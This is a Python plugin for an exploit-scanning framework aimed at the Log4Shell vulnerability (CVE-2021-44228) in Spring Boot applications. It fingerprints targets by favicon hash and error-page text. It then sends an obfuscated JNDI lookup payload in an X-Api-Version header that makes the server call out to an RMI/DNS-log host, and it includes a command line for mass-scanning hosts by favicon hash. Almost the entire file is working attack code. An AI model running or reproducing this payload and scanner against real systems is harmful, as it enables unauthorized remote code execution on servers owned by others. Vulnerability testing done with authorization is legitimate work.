# coding=utf-8
# @Author   : zpchcbd HG team
# @Blog     : https://www.cnblogs.com/zpchcbd/
# @Time     : 2021-12-07 20:32

from core.data import gLogger
from core.utils.dnslog import eyes_dnslog_verify, get_eyes_identifier
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *

# python3 batch.py -m exploit.scripts.SpringBoot.CVE-2021-44228 -cs -fs icon_hash=\"116323821\"


class Script(BaseScript):
    name = 'SpringBoot FrameWork'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2021-44228'
        # 来源
        self.bug_refer = 'https://github.com/projectdiscovery/nuclei-templates/blob/c8d2139e545775c34f5fb9e93d0da7a9d9aef0bd/vulnerabilities/springboot/springboot-log4j-rce.yaml'
        # 特定路径判断
        self.detect_path_list = ['/xxxxxxxxxxxxx', '/favicon.ico']
        # exec
        self.exec_path_list = ['/']
        # 相关信息
        self.info = 'Spring Boot is susceptible to remote code execution via Apache Log4j.'
        # favicon
        self.favicon_md5_list = ['0488faca4c19046b94d07c3ee83cf9d6']

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            url = f'http://{self.target}/favicon.ico' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/favicon.ico'
            favicon_md5 = await AsyncFetcher.get_favicon_md5_fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if favicon_md5 is not None and favicon_md5 in self.favicon_md5_list:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
            url = f'http://{self.target}/xxxxxxxxxx' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/xxxxxxxxxx'
            text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
            if 'Whitelabel Error Page' in text:
                self.flag = True
                gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                verify_random_int = random.randint(10000, 99999)
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = '$%7B$%7B::-j%7D$%7B::-n%7D$%7B::-d%7D$%7B::-i%7D:$%7B::-r%7D$%7B::-m%7D$%7B::-i%7D://{}.{}/a%7D'.format(verify_random_int, get_eyes_identifier())
                headers.update({'X-Api-Version': data})
                await AsyncFetcher.fetch(session=session, url=url, headers=headers, timeout=self.req_timeout)
                await asyncio.sleep(2)
                text = await eyes_dnslog_verify('dns', verify_random_int)
                if text is not None and text:
                    gLogger.myscan_info('[{} CVE-2021-44228 Verify:{}] {}'.format(self.name, verify_random_int, url))
                    return {'name': '{} CVE-2021-44228 Verify:{}'.format(self.name, verify_random_int), 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
